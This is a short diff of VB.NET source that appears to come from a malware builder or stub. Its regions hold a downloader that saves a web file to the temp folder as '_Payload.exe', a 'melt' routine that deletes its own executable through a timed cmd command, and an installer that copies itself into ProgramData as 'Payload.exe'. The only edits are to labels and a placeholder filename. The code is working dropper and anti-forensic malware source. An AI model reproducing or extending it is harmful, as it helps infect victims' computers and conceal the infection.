@@ -13,7 +13,7 @@
         MsgBox(AV)
     End Sub
 
-#Region "Download File From Web"
+#Region "Download File From Web [Downloader]"
     Public Sub DownloadFromWeb()
         Dim FilePath As String = IO.Path.GetTempFileName + "_Payload.exe"
         Using WC As New Net.WebClient
@@ -23,7 +23,7 @@
     End Sub
 #End Region
 
-#Region "Delete Itself [Melt]"
+#Region "Delete Itself"
     Public Sub SelfDelete()
         Dim Del As New Diagnostics.ProcessStartInfo With {
                            .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Diagnostics.Process.GetCurrentProcess.MainModule.FileName,
@@ -99,7 +99,7 @@
 #Region "Install Payload To Computer"
     Public Sub InstallPayload()
         Try
-            Dim ClientFullPath As String = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "%EXE%")
+            Dim ClientFullPath As String = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Payload.exe")
             Using Drop As New IO.FileStream(ClientFullPath, IO.FileMode.Create)
                 Dim Client As Byte() = IO.File.ReadAllBytes(Diagnostics.Process.GetCurrentProcess.MainModule.FileName)
                 Drop.Write(Client, 0, Client.Length)
